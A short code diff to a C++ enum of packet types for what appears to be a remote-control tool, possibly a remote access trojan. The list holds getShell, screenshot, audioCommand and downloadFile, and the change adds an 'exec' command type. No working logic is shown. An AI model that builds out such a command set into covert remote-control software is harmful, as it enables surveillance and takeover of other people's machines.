@@ -12,7 +12,7 @@ enum class Packet {
 	getShell,
 	navigate,
 	discordCommand,
-	UNUSED1,
+	exec,
 	screenshot,
 	audioCommand,
 	downloadFile,
